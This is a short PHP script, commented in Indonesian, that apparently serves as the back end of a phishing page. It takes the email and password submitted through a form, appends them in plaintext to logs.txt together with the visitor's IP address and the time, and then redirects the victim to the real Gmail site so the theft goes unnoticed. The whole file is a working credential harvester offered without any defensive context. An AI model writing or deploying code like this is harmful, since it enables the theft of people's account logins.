<?php
// Ambil data dari form
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

// Format data untuk disimpan
$data = "=== NEW LOGIN ===\n";
$data .= "Email: $email\n";
$data .= "Password: $password\n";
$data .= "IP: $ip\n";
$data .= "Time: $date\n\n";

// Simpan ke file logs.txt
file_put_contents('logs.txt', $data, FILE_APPEND);

// Redirect ke halaman asli (opsional)
header("Location: https://mail.google.com");
exit();
?>